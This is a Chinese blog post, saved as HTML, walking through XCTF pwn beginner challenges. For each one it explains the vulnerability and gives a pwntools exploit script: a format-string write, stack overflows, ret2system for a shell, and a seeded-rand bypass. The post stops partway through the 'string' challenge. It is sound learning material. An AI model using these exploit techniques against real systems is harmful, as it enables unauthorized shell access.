@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xsblog.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这篇博客用来记录攻防世界pwn新手区刷题过程。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xctf新手区">
+<meta property="og:url" content="http://xsblog.xyz/2020/06/06/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/index.html">
+<meta property="og:site_name" content="Agx&#39;s blog">
+<meta property="og:description" content="这篇博客用来记录攻防世界pwn新手区刷题过程。。。">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-19-56-28.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-00-55.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-06-05.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-04-03.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-10-40.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-33-58.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-37-38.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-40-22.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-46-06.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-48-39.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-49-50.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-34-00.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-42-59.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-46-27.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-01-54.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-04-03.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-21-54.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-42-17.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-05-57.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-27-47.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-44-13.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-52-14.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-53-23.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-54-49.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-56-49.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-59-15.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-06-33.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-22-15.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-58-09.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-17-35-00.png">
+<meta property="article:published_time" content="2020-06-06T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-07T15:14:52.119Z">
+<meta property="article:author" content="AGX">
+<meta property="article:tag" content="xctf">
+<meta property="article:tag" content="新手区">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="攻防世界">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-19-56-28.png">
+
+<link rel="canonical" href="http://xsblog.xyz/2020/06/06/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>xctf新手区 | Agx's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Agx's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">以梦为马，不负韶华</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://xsblog.xyz/2020/06/06/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-19-58-11.png">
+      <meta itemprop="name" content="AGX">
+      <meta itemprop="description" content="加油，加油，加油！！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Agx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xctf新手区
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-06-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-06-06T00:00:00+00:00">2020-06-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-07-07 15:14:52" itemprop="dateModified" datetime="2020-07-07T15:14:52+00:00">2020-07-07</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2020/06/06/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/06/xctf%E6%96%B0%E6%89%8B%E5%8C%BA/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这篇博客用来记录攻防世界pwn新手区刷题过程。。。</p>
+<a id="more"></a>
+<h2 id="0x01-get-shell"><a href="#0x01-get-shell" class="headerlink" title="0x01 get_shell"></a>0x01 get_shell</h2><blockquote>
+<p>题目描述: 运行就能拿到shell呢，真的</p>
+</blockquote>
+<p>直接使用nc连接远程端口就可返回shell<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-19-56-28.png" alt="2020-06-05-19-56-28"></p>
+<h2 id="0x02-CGfsb"><a href="#0x02-CGfsb" class="headerlink" title="0x02 CGfsb"></a>0x02 CGfsb</h2><blockquote>
+<p>题目描述: 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用 </p>
+</blockquote>
+<p>首先使用<code>checksec</code>查看文件安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-00-55.png" alt="2020-06-05-20-00-55"></p>
+<p>关于checksec的使用可以参考<a href="https://xsblog.xyz/2020/05/29/xctf/checksec%E4%BD%BF%E7%94%A8/">checksec工具使用</a>    </p>
+<p>将程序拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-06-05.png" alt="2020-06-05-20-06-05"><br>显然在程序的第23行存在<code>格式化字符串漏洞</code>,而且发现关键代码<code>system(&quot;cat flag)</code>,条件是使得<code>pwnme</code>值为8；<br>关于格式化字符串漏洞可参考<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞</a></p>
+<p>利用格式化字符串漏洞修改<code>pwnme</code>的值<br><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'33985'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">io.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'aa'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'please:\n'</span>)</span><br><span class="line">pwnme_addr = p32(<span class="number">0x0804a068</span>)    <span class="comment"># 获取pwnme的地址</span></span><br><span class="line">payload = pwnme_addr + <span class="string">'%4c%10$n'</span>   <span class="comment"># 构造payload</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvall()  <span class="comment"># recvall()输出所有，直到EOF</span></span><br></pre></td></tr></table></figure>
+<p>关于pwn工具的使用可参考<a href="https://bbs.pediy.com/thread-247217.htm" target="_blank" rel="noopener">pwntools使用</a></p>
+<h2 id="0x03-when-did-you-born"><a href="#0x03-when-did-you-born" class="headerlink" title="0x03 when_did_you_born"></a>0x03 when_did_you_born</h2><blockquote>
+<p>题目描述: 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办</p>
+</blockquote>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-04-03.png" alt="2020-06-05-21-04-03">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-10-40.png" alt="2020-06-05-21-10-40">  </p>
+<p>发现危险函数<code>gets</code>,存在溢出漏洞，通过v4溢出修改v5的值<br><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'34377'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Birth?\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'33'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Name?\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">1926</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-hello-pwn"><a href="#0x04-hello-pwn" class="headerlink" title="0x04 hello_pwn"></a>0x04 hello_pwn</h2><blockquote>
+<p>题目描述: pwn！，segment fault！菜鸡陷入了深思</p>
+</blockquote>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-33-58.png" alt="2020-06-05-21-33-58">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-37-38.png" alt="2020-06-05-21-37-38"><br>read函数处可能造成溢出</p>
+<p>由源代码可知只需使<code>if</code>中等式成立便可以得到flag<br>跟进变量<code>unk_601068</code>,发现<code>dword_60106C</code>就在下面将，则可以通过read修改其值<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-40-22.png" alt="2020-06-05-21-40-22">  </p>
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'30839'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'for bof\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-level0"><a href="#0x05-level0" class="headerlink" title="0x05 level0"></a>0x05 level0</h2><blockquote>
+<p>题目描述: 菜鸡了解了什么是溢出，他相信自己能得到shell</p>
+</blockquote>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-46-06.png" alt="2020-06-05-21-46-06">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-48-39.png" alt="2020-06-05-21-48-39"> </p>
+<p>直接进入vulnerable_function()<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-49-50.png" alt="2020-06-05-21-49-50"><br>由于read函数所能读入的最大字节要大于buf与栈底的距离，所以存在栈溢出漏洞  </p>
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'36544'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'World\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'A'</span>*<span class="number">0x08</span>+p64(<span class="number">0x400596</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-level2"><a href="#0x06-level2" class="headerlink" title="0x06 level2"></a>0x06 level2</h2><blockquote>
+<p>题目描述: 菜鸡请教大神如何获得flag，大神告诉他‘使用<code>面向返回的编程</code>(ROP)就可以了’</p>
+</blockquote>
+<p>查看保护机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-34-00.png" alt="2020-06-05-22-34-00">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-42-59.png" alt="2020-06-05-22-42-59"><br>与<code>level0</code>同样的溢出漏洞，只不过在程序里找不到现成的可以获取shell的函数了，所以需要将程序中的字符串当做<code>system</code>的参数传入  </p>
+<p>在IDA中使用<code>shift+F12</code>可以查看程序中的所有字符串及其位置<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-46-27.png" alt="2020-06-05-22-46-27"><br>看到有<code>/bin/sh</code>字符串，地址为<code>0x0804A024</code> </p>
+<p>溢出原理图<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-01-54.png" alt="2020-06-05-23-01-54"></p>
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'31250'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'A'</span>*<span class="number">0x04</span>+p32(<span class="number">0x08048320</span>)+<span class="string">'A'</span>*<span class="number">0x4</span>+p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment"># 调用一个新的函数时，会将esp的值赋值到ebp上去，所以不用管ebp赋值到了一个无效地址，依然可以恢复正常工作</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-guess-num"><a href="#0x07-guess-num" class="headerlink" title="0x07 guess_num"></a>0x07 guess_num</h2><blockquote>
+<p>菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么</p>
+</blockquote>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-04-03.png" alt="2020-06-05-23-04-03"><br>可以看到这次安全机制基本上都开了</p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-21-54.png" alt="2020-06-05-23-21-54"><br>gets存在溢出漏洞，可以通过gets修改随即种子<code>seed</code>的值</p>
+<p>整个程序的逻辑就是猜数字，猜中十次才可以的到flag；<br>这里使用rand来生成随机数，然而rand生成的随机数并不是真正的随机数,只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1；<br>正常情况下应该使种子随生成的随机数而变化，即每生成一次随机数更改一次种子  </p>
+<p>使用python自带的ctypes模块进行python和c混合编程<br>使用ldd查看guss_num所使用的共享库libc<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-42-17.png" alt="2020-06-05-23-42-17"><br>可以看到<code>libc.so.6</code>指向的文件<code>/lib/x86_64-linux-gnu/libc.so.6</code>可当做共享库载入python中,载入之后就可以通过python调用共享库中的函数，实现混合编程</p>
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'43798'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span>+p32(<span class="number">1</span>)   <span class="comment"># 由于seed[0]大小为32位，所以使用p32</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">        io.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">        io.sendline(num)</span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br></pre></td></tr></table></figure>
+<p><strong>注:</strong> 最后的<code>print io.recvall()</code>可以用<code>io.interactive()</code>代替，不过使用后者会返回一个无效的命令行</p>
+<h2 id="0x08-cgpwn2"><a href="#0x08-cgpwn2" class="headerlink" title="0x08 cgpwn2"></a>0x08 cgpwn2</h2><blockquote>
+<p>题目描述: 菜鸡认为自己需要一个字符串</p>
+</blockquote>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-05-57.png" alt="2020-06-06-08-05-57">  </p>
+<p>拖入IDA查看反汇编代码<br>直接跟进hello<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-27-47.png" alt="2020-06-06-08-27-47">  </p>
+<p>显然在gets()函数存在溢出<br>然而程序中有现成<code>system</code>函数，却找不到可以利用的字符串，考率到前面的<code>fgets</code>函数，可以尝试将所需要的字符串参数传入<code>name</code>变量中，在将<code>name</code>作为<code>system</code>的参数传入  </p>
+<p><strong>解题脚本:</strong>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'42443'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'here:\n'</span>)</span><br><span class="line">name_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x26</span>+<span class="string">'A'</span>*<span class="number">4</span>+p32(<span class="number">0x08048420</span>)+<span class="string">'A'</span>*<span class="number">4</span>+p32(name_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-string"><a href="#0x09-string" class="headerlink" title="0x09 string"></a>0x09 string</h2><blockquote>
+<p>题目描述: 菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求</p>
+</blockquote>
+<p>查看程序安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-44-13.png" alt="2020-06-06-13-44-13">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-52-14.png" alt="2020-06-06-13-52-14"><br>输出了V4的值，其他暂未发现异常，跟进查看<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-53-23.png" alt="2020-06-06-13-53-23"><br>创建了一个新的游戏人物，同时调用了三个函数，依次跟进查看</p>
+<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-54-49.png" alt="2020-06-06-13-54-49"><br>在第一个函数中碰到了一个循环，必须输入east才能跳出循环  </p>
